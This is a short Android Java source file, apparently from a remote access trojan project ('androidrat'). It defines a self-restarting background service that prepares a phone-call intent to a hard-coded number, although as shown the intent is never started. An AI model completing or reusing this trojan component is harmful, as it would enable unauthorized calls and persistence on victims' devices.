package com.ot.androidrat;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;

public class CallService extends Service {
    public CallService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Intent callIntent = new Intent(Intent.ACTION_CALL);
        callIntent.setData(Uri.parse("tel:" + 12345678));
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}